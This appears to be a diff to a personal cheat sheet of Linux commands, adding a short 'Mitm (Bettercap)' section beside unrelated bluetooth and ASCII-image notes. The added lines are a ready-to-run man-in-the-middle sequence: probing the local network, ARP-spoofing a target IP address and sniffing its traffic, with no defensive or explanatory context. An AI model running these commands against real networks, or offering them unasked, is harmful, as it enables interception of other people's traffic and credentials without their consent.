@@ -185,6 +185,13 @@ sudo systemctl start bluetooth.service
 //image ascii
 jp2a a.jpg --colors
 
+///Mitm (Bettercap)
+net.probe on
+net.show
+set arp.spoof.targets 192.168.0.104(terget ip)
+arp.spoof on
+net.sniff on
+
 
 
 
